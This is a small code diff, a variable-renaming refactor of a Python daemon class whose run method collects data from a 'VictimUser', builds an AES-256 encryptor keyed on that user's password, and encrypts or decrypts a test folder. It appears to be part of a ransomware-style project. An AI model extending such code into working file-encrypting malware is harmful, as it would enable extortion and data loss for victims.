@@ -3,7 +3,7 @@ import User
 
 class DaemonLinux():
 
-    def __init__(self,tout = 5):
+    def __init__(self, tout = 5):
         self.stdin_path = '/dev/null'
         self.stdout_path = '/dev/tty'
         self.stderr_path = '/dev/tty'
@@ -11,8 +11,8 @@ class DaemonLinux():
         self.pidfile_timeout = tout # default = 5
 
     def run(self):
-        myUser = User.VictimUser()
-        myUser.saveUserData()
-        myEncryptor = Encryptor.AES256Encryptor(myUser.userPassword);
-        #myEncryptor.encryptFolder("/home/alessio/PycharmProjects/MyEncryptor/test_encrypt/")
-        myEncryptor.decryptFolder("/home/alessio/PycharmProjects/MyEncryptor/test_encrypt/")
+        user = User.VictimUser()
+        user.saveUserData()
+        encryptor = Encryptor.AES256(user.Psw);
+        #encryptor.encryptFolder("/home/alessio/PycharmProjects/MyEncryptor/test_encrypt/")
+        encryptor.decryptFolder("/home/alessio/PycharmProjects/MyEncryptor/test_encrypt/")
